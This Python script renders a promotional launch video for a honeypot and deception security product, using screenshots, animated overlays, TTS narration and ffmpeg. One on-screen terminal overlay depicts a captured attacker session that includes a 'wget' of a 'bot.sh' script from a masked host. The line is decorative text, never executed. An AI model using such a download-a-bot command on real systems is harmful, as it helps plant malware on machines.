#!/usr/bin/env python3
"""WraithWall OSS — Official 70s launch film (documentary · real UI · orbit open)."""
from __future__ import annotations

import asyncio
import math
import subprocess
from dataclasses import dataclass
from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

W, H = 1280, 720
FPS = 24
FILM_DURATION = 70.0
FRAMES = int(FPS * FILM_DURATION)

DOCS_DIR = Path(__file__).resolve().parent
SCREEN_DIR = DOCS_DIR / "real-screens"
STATIC_DIR = Path("/home/deploy/ezmcyber/static/img/oss-launch")
OUT_DIR = Path("/tmp/ww-film-frames")
OUT_MP4 = Path("/tmp/wraithwall-oss-launch-film.mp4")
AUDIO_DIR = Path("/tmp/ww-film-audio")

TTS_VOICE = "en-NG-AbeoNeural"  # Nigerian English — same voice as v5 launch video

# Palette — WraithWall official (paper + navy orbit, not cyberpunk)
NAVY = (11, 20, 38)
GRAPHITE = (17, 19, 24)
PAPER = (250, 250, 247)
INK = (26, 26, 26)
INK_MUTED = (107, 107, 107)
SIGNAL = (196, 26, 26)
HUD = (255, 255, 255, 40)

NARRATIONS = [
    (5.0, "Most security platforms focus on detecting attacks. WraithWall was built to understand them."),
    (15.0, "Built from real production infrastructure… now becoming open source."),
    (41.0, "This isn't a concept. It's software designed to be inspected, challenged, and improved."),
    (51.0, "Built quietly. Released openly."),
]

ONSCREEN = {
    5: ("Most security platforms focus on detecting attacks.", "WraithWall was built to understand them."),
    15: ("Built from real production infrastructure…", "now becoming open source."),
    41: ("This isn't a concept.", "It's software designed to be inspected, challenged, and improved."),
    51: ("Built quietly.", "Released openly."),
}

MONTAGE = [
    ("Canary Kit", "launch.png"),
    ("DML Spec", "docs.png"),
    ("RavenScan", "architecture.png"),
    ("Honeypot MITRE", "security.png"),
    ("Threat Intelligence", "bgp-monitor.png"),
    ("Gateway", "landing-hero.png"),
    ("Incident Response", "incident-playbook.png"),
    ("Knowledge", "roadmap.png"),
]


@dataclass
class Act:
    t0: float
    t1: float
    kind: str
    image: str | None = None
    pan_y: float = 0.0


ACTS = [
    Act(0, 5, "orbit"),
    Act(5, 15, "attack", "landing-terminal.png", -0.05),
    Act(15, 25, "production", "architecture.png", 0.04),
    Act(25, 41, "montage"),
    Act(41, 51, "github", "github-toolkit.png"),
    Act(51, 58, "orbit_return"),
    Act(58, 70, "endcard"),
]


def lerp(a: float, b: float, t: float) -> float:
    return a + (b - a) * max(0.0, min(1.0, t))


def ease(t: float) -> float:
    return t * t * (3 - 2 * t)


def load_font(size: int, bold: bool = False, mono: bool = False) -> ImageFont.FreeTypeFont:
    if mono:
        paths = ["/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"]
    elif bold:
        paths = ["/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"]
    else:
        paths = ["/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"]
    for p in paths:
        if Path(p).exists():
            return ImageFont.truetype(p, size)
    return ImageFont.load_default()


def probe_duration(path: Path) -> float:
    return float(
        subprocess.check_output(
            ["ffprobe", "-v", "error", "-show_entries", "format=duration",
             "-of", "default=noprint_wrappers=1:nokey=1", str(path)],
            text=True,
        ).strip()
    )


def capture_screenshots() -> None:
    from playwright.sync_api import sync_playwright

    SCREEN_DIR.mkdir(parents=True, exist_ok=True)
    base = "https://wraithwall.online"
    shots = [
        ("landing-hero", f"{base}/", 0),
        ("landing-terminal", f"{base}/", 680),
        ("architecture", f"{base}/architecture", 0),
        ("launch", f"{base}/launch", 0),
        ("docs", f"{base}/docs", 0),
        ("bgp-monitor", f"{base}/bgp-monitor", 0),
        ("security", f"{base}/security", 0),
        ("roadmap", f"{base}/roadmap", 0),
        ("incident-playbook", f"{base}/incident-playbook", 0),
        ("github-toolkit", "https://github.com/niffyhunt/wraithwall-toolkit", 0),
        ("oss-diagram", f"{base}/static/img/oss-launch/oss-ecosystem.png", 0),
    ]
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        page = browser.new_page(viewport={"width": W, "height": H})
        for name, url, scroll in shots:
            page.goto(url, wait_until="domcontentloaded", timeout=45000)
            page.wait_for_timeout(2200)
            if scroll:
                page.evaluate(f"window.scrollTo({{top: {scroll}, behavior: 'instant'}})")
                page.wait_for_timeout(800)
            page.screenshot(path=str(SCREEN_DIR / f"{name}.png"))
            print("captured", name)
        browser.close()


def draw_orbit(t: float, title: bool = False, return_earth: bool = False) -> Image.Image:
    """Earth orbit cold open / return — documentary, not cyberpunk."""
    img = Image.new("RGB", (W, H), NAVY)
    draw = ImageDraw.Draw(img, "RGBA")

    # Subtle grid
    for x in range(0, W, 48):
        draw.line([(x, 0), (x, H)], fill=(255, 255, 255, 6))
    for y in range(0, H, 48):
        draw.line([(0, y), (W, y)], fill=(255, 255, 255, 6))

    # Earth limb
    cx, cy = W // 2, H + 120
    rx, ry = 520, 140
    phase = t * 0.15
    for i in range(ry, 0, -2):
        ratio = i / ry
        c = int(lerp(14, 32, ratio))
        draw.ellipse([cx - rx, cy - i, cx + rx, cy + i], fill=(c, c + 4, c + 10))

    # Horizon glow
    for i in range(40):
        a = int(35 * (1 - i / 40))
        draw.arc([cx - rx, cy - ry - 20, cx + rx, cy + ry - 20], 200, 340, fill=(42, 106, 156, a), width=2)

    # Telemetry arcs
    arc_prog = ease(min(t / 4.0, 1.0))
    arcs = [
        ((200, 80), (W - 200, 200), (W // 2, 320)),
        ((W - 180, 90), (180, 210), (W // 2 + 40, 300)),
    ]
    for (sx, sy), (ex, ey), (mx, my) in arcs:
        steps = int(60 * arc_prog)
        pts = []
        for j in range(steps + 1):
            tt = j / 60
            px = (1 - tt) ** 2 * sx + 2 * (1 - tt) * tt * mx + tt ** 2 * ex
            py = (1 - tt) ** 2 * sy + 2 * (1 - tt) * tt * my + tt ** 2 * ey
            pts.append((px, py))
        if len(pts) > 1:
            draw.line(pts, fill=(255, 255, 255, 35), width=1)

    # Pulse nodes
    for px, py in [(W // 2 - 120, 280), (W // 2 + 90, 290), (W // 2, 250)]:
        pr = 6 + 3 * math.sin(t * 2.5 + px)
        draw.ellipse([px - pr, py - pr, px + pr, py + pr], fill=(196, 26, 26, 80))

    # Satellite
    sat_x = 980 + math.sin(t * 0.4) * 20
    sat_y = 100 + math.cos(t * 0.35) * 8
    draw.rounded_rectangle([sat_x - 20, sat_y - 6, sat_x + 20, sat_y + 6], radius=2, fill=(30, 36, 48))
    draw.rectangle([sat_x - 36, sat_y - 10, sat_x - 22, sat_y + 10], fill=(42, 48, 58))
    draw.rectangle([sat_x + 22, sat_y - 10, sat_x + 36, sat_y + 10], fill=(42, 48, 58))
    draw.ellipse([sat_x - 3, sat_y - 3, sat_x + 3, sat_y + 3], fill=SIGNAL)

    if title:
        alpha = ease(lerp(0, 1, max(0, (t - 3.0) / 1.5)))
        f_title = load_font(52, bold=True)
        f_sub = load_font(14, mono=True)
        title_txt = "WraithWall OSS"
        tw = draw.textlength(title_txt, font=f_title)
        draw.text(((W - tw) / 2, H // 2 - 40), title_txt, font=f_title, fill=(250, 250, 247, int(255 * alpha)))
        sub = "OPERATIONAL DECEPTION · OPEN SOURCE"
        sw = draw.textlength(sub, font=f_sub)
        draw.text(((W - sw) / 2, H // 2 + 24), sub, font=f_sub, fill=(140, 140, 135, int(200 * alpha)))

    if return_earth:
        vign = Image.new("RGBA", (W, H), (0, 0, 0, 0))
        vd = ImageDraw.Draw(vign)
        for i in range(60):
            a = int(i * 1.2)
            vd.rectangle([0, i, W, i + 1], fill=(0, 0, 0, a))
            vd.rectangle([0, H - i, W, H - i + 1], fill=(0, 0, 0, a))
        img = Image.alpha_composite(img.convert("RGBA"), vign).convert("RGB")

    return img


def ken_burns(img: Image.Image, zoom: float, pan_x: float = 0, pan_y: float = 0) -> Image.Image:
    iw, ih = img.size
    cw, ch = int(W / zoom), int(H / zoom)
    cx = iw / 2 + pan_x * iw
    cy = ih / 2 + pan_y * ih
    left = int(max(0, min(iw - cw, cx - cw / 2)))
    top = int(max(0, min(ih - ch, cy - ch / 2)))
    return img.crop((left, top, left + cw, top + ch)).resize((W, H), Image.Resampling.LANCZOS)


def draw_paper_grade(img: Image.Image) -> Image.Image:
    """Slight paper warmth on live UI shots."""
    overlay = Image.new("RGB", (W, H), PAPER)
    return Image.blend(img, overlay, 0.04)


def draw_typography(img: Image.Image, lines: tuple[str, str], t_local: float, dark: bool = False) -> Image.Image:
    overlay = Image.new("RGBA", (W, H), (0, 0, 0, 0))
    draw = ImageDraw.Draw(overlay)
    f1 = load_font(28, bold=True)
    f2 = load_font(20)
    color1 = (250, 250, 247, 255) if dark else (26, 26, 26, 255)
    color2 = (200, 200, 195, 255) if dark else (80, 80, 75, 255)

    a1 = ease(lerp(0, 1, min(t_local / 0.35, 1)))
    a2 = ease(lerp(0, 1, max(0, (t_local - 0.45) / 0.35)))

    y = H - 160
    x = 64
    if a1 > 0:
        line1 = lines[0]
        if "WraithWall" in line1:
            pre, _, post = line1.partition("WraithWall")
            cx = x
            if pre:
                draw.text((cx, y), pre, font=f1, fill=(*color1[:3], int(255 * a1)))
                cx += int(draw.textlength(pre, font=f1))
            draw.text((cx, y), "WraithWall", font=f1, fill=(*SIGNAL, int(255 * a1)))
            cx += int(draw.textlength("WraithWall", font=f1))
            if post:
                draw.text((cx, y), post, font=f1, fill=(*color1[:3], int(255 * a1)))
        else:
            draw.text((x, y), line1, font=f1, fill=(*color1[:3], int(255 * a1)))
    if a2 > 0 and lines[1]:
        accent = SIGNAL if "open source" in lines[1].lower() else color2[:3]
        draw.text((x, y + 42), lines[1], font=f2, fill=(*accent, int(255 * a2)))

    # Accent rule
    draw.rectangle([64, y - 12, 120, y - 8], fill=(*SIGNAL, int(180 * a1)))

    base = img.convert("RGBA")
    return Image.alpha_composite(base, overlay).convert("RGB")


def draw_terminal_overlay(img: Image.Image, t: float) -> Image.Image:
    lines = [
        "$ ssh root@203.0.113.42 -p 2222",
        "cowrie.session.start uid=44102",
        "cmd: wget http://185.234.XX.XX/bot.sh",
    ]
    overlay = Image.new("RGBA", (W, H), (0, 0, 0, 0))
    draw = ImageDraw.Draw(overlay)
    mono = load_font(12, mono=True)
    y0 = H - 200
    for i, full in enumerate(lines):
        chars = int(max(0, (t - 1.2 - i * 1.1) * 22))
        text = full[:chars]
        if chars > 0:
            draw.text((72, y0 + i * 20), text, font=mono, fill=(120, 200, 140, 220))
    if int(t * 3) % 2 == 0:
        draw.text((72, y0 + len(lines) * 20), "▌", font=mono, fill=(120, 200, 140, 180))
    base = img.convert("RGBA")
    return Image.alpha_composite(base, overlay).convert("RGB")


def draw_montage_label(img: Image.Image, label: str, idx: int, local: float) -> Image.Image:
    overlay = Image.new("RGBA", (W, H), (0, 0, 0, 0))
    draw = ImageDraw.Draw(overlay)
    f = load_font(36, bold=True)
    mono = load_font(11, mono=True)
    a = ease(lerp(0, 1, min(local / 0.25, 1)))
    out_a = ease(lerp(1, 0, max(0, (local - 0.75) / 0.25)))
    alpha = min(a, out_a)
    draw.rectangle([0, 0, W, 72], fill=(8, 9, 11, int(200 * alpha)))
    draw.text((64, 20), f"{idx+1:02d}", font=mono, fill=(120, 120, 115, int(255 * alpha)))
    draw.text((100, 16), label, font=f, fill=(250, 250, 247, int(255 * alpha)))
    draw.rectangle([64, 58, 64 + len(label) * 12, 60], fill=(*SIGNAL, int(255 * alpha)))
    base = img.convert("RGBA")
    return Image.alpha_composite(base, overlay).convert("RGB")


def draw_endcard(t: float) -> Image.Image:
    img = Image.new("RGB", (W, H), (0, 0, 0))
    draw = ImageDraw.Draw(img)
    a = ease(lerp(0, 1, min(t / 1.5, 1)))
    f1 = load_font(44, bold=True)
    f2 = load_font(18, mono=True)
    lines = ["WraithWall OSS", "wraithwall.online", "github.com/niffyhunt/wraithwall"]
    y = H // 2 - 60
    for i, ln in enumerate(lines):
        font = f1 if i == 0 else f2
        col = (250, 250, 247) if i == 0 else (150, 150, 145)
        tw = draw.textlength(ln, font=font)
        draw.text(((W - tw) / 2, y + i * 52), ln, font=font, fill=tuple(int(c * a) for c in col))
    return img


def act_at(t: float) -> tuple[Act, float]:
    for act in ACTS:
        if act.t0 <= t < act.t1:
            return act, (t - act.t0) / (act.t1 - act.t0)
    return ACTS[-1], 1.0


def blend_frames(a: Image.Image, b: Image.Image, alpha: float) -> Image.Image:
    if alpha <= 0:
        return a
    if alpha >= 1:
        return b
    return Image.blend(a, b, alpha)


def render_frame(i: int, screens: dict[str, Image.Image]) -> Image.Image:
    t = i / FPS
    act, local = act_at(t)

    # Crossfade at act boundaries
    fade = 0.6
    next_act = None
    for j, a in enumerate(ACTS):
        if a.t0 <= t < a.t1 and j + 1 < len(ACTS):
            next_act = ACTS[j + 1]
            if t > a.t1 - fade:
                xfade = (t - (a.t1 - fade)) / fade
            else:
                xfade = 0.0
            break
    else:
        xfade = 0.0

    def render_act(ac: Act, loc: float) -> Image.Image:
        if ac.kind == "orbit":
            return draw_orbit(t, title=True)
        if ac.kind == "orbit_return":
            return draw_orbit(t, return_earth=True)
        if ac.kind == "endcard":
            return draw_endcard(t - ac.t0)
        if ac.kind == "montage":
            idx = min(int(loc * len(MONTAGE)), len(MONTAGE) - 1)
            loc2 = (loc * len(MONTAGE)) % 1.0
            label, img_name = MONTAGE[idx]
            base = ken_burns(screens[img_name], lerp(1.02, 1.12, loc2), pan_x=lerp(-0.02, 0.02, loc))
            base = draw_paper_grade(base)
            return draw_montage_label(base, label, idx, loc2)
        if ac.kind == "attack":
            base = ken_burns(screens[ac.image], lerp(1.0, 1.08, loc), pan_y=lerp(0, ac.pan_y, loc))
            base = draw_paper_grade(base)
            base = draw_terminal_overlay(base, t - ac.t0)
            if int(ac.t0) in ONSCREEN:
                base = draw_typography(base, ONSCREEN[int(ac.t0)], t - ac.t0, dark=False)
            return base
        if ac.kind == "production":
            # Blend architecture → launch → bgp across act
            imgs = ["architecture.png", "launch.png", "bgp-monitor.png"]
            seg = loc * 3
            i0 = min(int(seg), 2)
            i1 = min(i0 + 1, 2)
            blend = seg - i0
            f0 = ken_burns(screens[imgs[i0]], lerp(1.0, 1.06, loc), pan_y=lerp(0, 0.03, loc))
            f1 = ken_burns(screens[imgs[i1]], lerp(1.0, 1.06, loc), pan_y=lerp(0, 0.03, loc))
            base = blend_frames(f0, f1, ease(blend))
            base = draw_paper_grade(base)
            if int(ac.t0) in ONSCREEN:
                base = draw_typography(base, ONSCREEN[int(ac.t0)], t - ac.t0)
            return base
        if ac.kind == "github":
            base = ken_burns(screens[ac.image], lerp(1.0, 1.05, loc), pan_y=lerp(0, 0.08, loc))
            if loc > 0.5:
                docs = ken_burns(screens["docs.png"], 1.04, pan_y=0.02)
                base = blend_frames(base, docs, ease((loc - 0.5) / 0.5))
            if int(ac.t0) in ONSCREEN:
                base = draw_typography(base, ONSCREEN[int(ac.t0)], t - ac.t0, dark=False)
            return base
        return Image.new("RGB", (W, H), PAPER)

    frame = render_act(act, local)
    if next_act and xfade > 0:
        nxt = render_act(next_act, 0.0)
        frame = blend_frames(frame, nxt, ease(xfade))

    return frame


def load_screens() -> dict[str, Image.Image]:
    screens = {}
    names = {m[1] for m in MONTAGE} | {a.image for a in ACTS if a.image}
    names |= {"architecture.png", "launch.png", "bgp-monitor.png", "docs.png"}
    for name in names:
        path = SCREEN_DIR / name
        if not path.exists():
            raise FileNotFoundError(f"Missing {path} — run: python3 render_launch_film.py capture")
        screens[name] = Image.open(path).convert("RGB")
    return screens


async def _tts(text: str, out: Path) -> None:
    import edge_tts
    for attempt in range(4):
        try:
            await edge_tts.Communicate(text, TTS_VOICE).save(str(out))
            return
        except Exception:
            await asyncio.sleep(2 * (attempt + 1))
    raise RuntimeError(f"TTS failed: {out}")


def build_audio() -> Path:
    import edge_tts  # noqa: F401

    AUDIO_DIR.mkdir(parents=True, exist_ok=True)

    async def _all() -> list[tuple[float, Path]]:
        jobs = []
        for i, (start, text) in enumerate(NARRATIONS):
            mp3 = AUDIO_DIR / f"narr_{i}.mp3"
            await _tts(text, mp3)
            jobs.append((start, mp3))
        return jobs

    narr_files = asyncio.run(_all())

    # Build silent base + place narration at timestamps
    bed = AUDIO_DIR / "bed.wav"
    filt = (
        f"[0]volume=0.06,lowpass=f=200[a];"
        f"[1]volume=0.04,lowpass=f=350[b];"
        f"[a][b]amix=inputs=2:duration=first,"
        f"afade=t=in:st=0:d=3,afade=t=out:st={FILM_DURATION - 4}:d=4"
    )
    subprocess.run(
        [
            "ffmpeg", "-y",
            "-f", "lavfi", "-i", f"sine=frequency=55:duration={FILM_DURATION}",
            "-f", "lavfi", "-i", f"sine=frequency=110:duration={FILM_DURATION}",
            "-filter_complex", filt,
            "-ar", "44100", "-ac", "2", str(bed),
        ],
        check=True,
        capture_output=True,
    )

    inputs = ["-i", str(bed)]
    filters = ["[0]volume=0.75[bed]"]
    streams = ["[bed]"]
    for i, (start, mp3) in enumerate(narr_files):
        wav = AUDIO_DIR / f"narr_{i}.wav"
        subprocess.run(["ffmpeg", "-y", "-i", str(mp3), "-ar", "44100", "-ac", "2", str(wav)], check=True, capture_output=True)
        inputs.extend(["-i", str(wav)])
        idx = i + 1
        delay_ms = int(start * 1000)
        filters.append(f"[{idx}]adelay={delay_ms}|{delay_ms},volume=1.3[v{i}]")
        streams.append(f"[v{i}]")

    n = len(streams)
    filt = ";".join(filters) + f";{''.join(streams)}amix=inputs={n}:duration=first:dropout_transition=0[m]"
    mixed = AUDIO_DIR / "mixed.wav"
    subprocess.run(
        ["ffmpeg", "-y", *inputs, "-filter_complex", filt, "-map", "[m]", "-ar", "44100", "-ac", "2", str(mixed)],
        check=True,
        capture_output=True,
    )
    return mixed


def main() -> None:
    screens = load_screens()
    print(f"=== rendering {FRAMES} frames ({FILM_DURATION}s) ===")
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    for old in OUT_DIR.glob("frame_*.png"):
        old.unlink()
    for i in range(FRAMES):
        render_frame(i, screens).save(OUT_DIR / f"frame_{i:04d}.png")
        if i % 48 == 0:
            print(f"  {i}/{FRAMES}")

    subprocess.run(
        [
            "ffmpeg", "-y", "-framerate", str(FPS), "-i", str(OUT_DIR / "frame_%04d.png"),
            "-c:v", "libx264", "-pix_fmt", "yuv420p", "-crf", "17",
            "-movflags", "+faststart", str(OUT_MP4),
        ],
        check=True,
    )

    print("=== audio ===")
    mixed = build_audio()
    final = Path("/tmp/wraithwall-oss-launch-film-audio.mp4")
    subprocess.run(
        [
            "ffmpeg", "-y", "-i", str(OUT_MP4), "-i", str(mixed),
            "-c:v", "copy", "-c:a", "aac", "-b:a", "192k",
            "-shortest", "-movflags", "+faststart", str(final),
        ],
        check=True,
    )

    for dest in (DOCS_DIR / "wraithwall-oss-launch-film.mp4", STATIC_DIR / "wraithwall-oss-launch-film.mp4"):
        dest.write_bytes(final.read_bytes())
        print("wrote", dest, dest.stat().st_size // 1024, "KB")

    (STATIC_DIR / "launch-film-production.md").write_text((DOCS_DIR / "launch-film-production.md").read_text())


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "capture":
        capture_screenshots()
    else:
        main()